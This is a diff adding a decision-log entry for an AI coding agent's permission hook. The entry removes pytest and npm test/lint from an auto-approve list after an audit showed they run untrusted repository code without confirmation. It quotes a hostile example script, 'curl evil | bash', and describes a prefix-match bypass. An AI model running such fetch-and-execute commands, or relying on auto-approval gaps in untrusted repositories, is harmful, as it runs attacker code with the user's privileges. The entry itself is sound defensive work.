@@ -101,3 +101,29 @@
   ("one canonical memory root") without doing the riskier full retirement of `memory/` in the
   same pass. Restores the write and read path both hooks already expected.
 - **Status:** active
+
+### [2026-07-17] SEC-01: removed pytest/npm test/npm run test/npm run lint from auto-allow
+- **Problem:** External security audit found `hooks/permission_policy.py`'s `SAFE_BASH_PREFIXES`
+  auto-approved `pytest`, `python -m pytest`, `npm test`, `npm run test`, `npm run lint` via
+  `cmd_lower.startswith(prefix)`. Unlike the other safe prefixes (git introspection, ruff, mypy —
+  none of which execute repository-authored code), these commands EXECUTE it: pytest imports
+  `conftest.py`/fixtures/plugins from the working tree before running a single test; `npm test`/
+  `npm run <script>` runs whatever arbitrary shell command `package.json`'s `scripts` section
+  defines. A malicious `conftest.py` or a `"test": "curl evil | bash"` package.json script would
+  execute with the user's privileges, with zero confirmation, the moment an agent ran "the tests"
+  in an untrusted repository. The prefix match also collided on lookalike executable names
+  (`pytest-malicious` starts with "pytest"). An existing test (`test_pytest_allowed`) explicitly
+  asserted the old behavior as correct — this was a deliberate design choice (fewer prompts), not
+  an oversight, but the threat-model gap for untrusted repos was real.
+- **Decision:** Removed all 5 from `SAFE_BASH_PREFIXES`; they now require explicit "ask" like any
+  other command. `ruff`/`mypy` remain auto-allowed (pure static analysis, no code execution).
+  Did NOT implement the audit's full remediation roadmap (sandboxed test-runner profile,
+  capability-scoped approval, exact-argv parsing) — that is a much larger engineering project;
+  this fix closes the specific auto-allow bypass, not the general "should test runners ever be
+  safe to auto-run" question.
+- **Rationale:** The security cost (arbitrary code execution in untrusted repos, zero
+  confirmation) outweighs the convenience benefit (fewer prompts) for a config whose whole
+  premise is evidence-based trust, not convenience-first defaults. Matches the same precedent
+  already set for `cat`/`head`/`tail`/`wc` reading sensitive paths (security audit 2026-07-07/
+  07-12) — narrow the auto-allow surface to genuinely side-effect-free operations only.
+- **Status:** active
